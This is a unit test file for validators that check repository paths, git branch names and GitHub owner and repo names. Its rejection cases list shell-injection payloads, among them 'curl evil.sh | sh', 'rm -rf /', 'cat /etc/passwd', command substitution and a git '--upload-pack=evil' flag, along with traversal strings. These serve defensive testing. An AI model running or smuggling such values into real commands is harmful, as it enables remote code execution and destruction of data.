import { describe, it, expect } from "vitest"
import { isSafeRepoPath, isSafeBranchName, isSafeRepoSegment } from "./ref-validation"

describe("isSafeRepoPath", () => {
  it("accepts the app's real sandbox paths", () => {
    expect(isSafeRepoPath("/home/daytona/project")).toBe(true)
    expect(isSafeRepoPath("/workspace/repo-name.2")).toBe(true)
  })

  it("rejects shell-injection payloads and traversal", () => {
    for (const bad of [
      "/x; curl evil.sh | sh; #",
      "/x && rm -rf /",
      "/x`id`",
      "/x$(id)",
      "/x | cat /etc/passwd",
      "/x\nwhoami",
      "/home/../etc",
      "relative/path", // not absolute
      "",
      42,
      null,
      undefined,
    ]) {
      expect(isSafeRepoPath(bad as unknown)).toBe(false)
    }
  })
})

describe("isSafeBranchName", () => {
  it("accepts the app's real branch names", () => {
    for (const ok of ["main", "feat/token-track", "fix/security-issues", "release-1.2.3", "_cleanup/rebase-123"]) {
      expect(isSafeBranchName(ok)).toBe(true)
    }
  })

  it("rejects shell/URL metacharacters, flags and traversal", () => {
    for (const bad of [
      "main; rm -rf /",
      "$(id)",
      "`id`",
      "a|b",
      "a b",
      "a&b",
      "--upload-pack=evil",
      "-x",
      "/leading-slash",
      "trailing/",
      "a..b",
      "feature#frag",
      "",
      null,
    ]) {
      expect(isSafeBranchName(bad as unknown)).toBe(false)
    }
  })
})

describe("isSafeRepoSegment", () => {
  it("accepts real GitHub owners and repo names", () => {
    for (const ok of ["jamesmurdza", "background-agents", "next.js", "a_b-c.d"]) {
      expect(isSafeRepoSegment(ok)).toBe(true)
    }
  })

  it("rejects injection payloads and path separators", () => {
    for (const bad of ["a/b", "a; id", "$(id)", "a b", "-flag", "..", "owner`x`", ""]) {
      expect(isSafeRepoSegment(bad as unknown)).toBe(false)
    }
  })
})
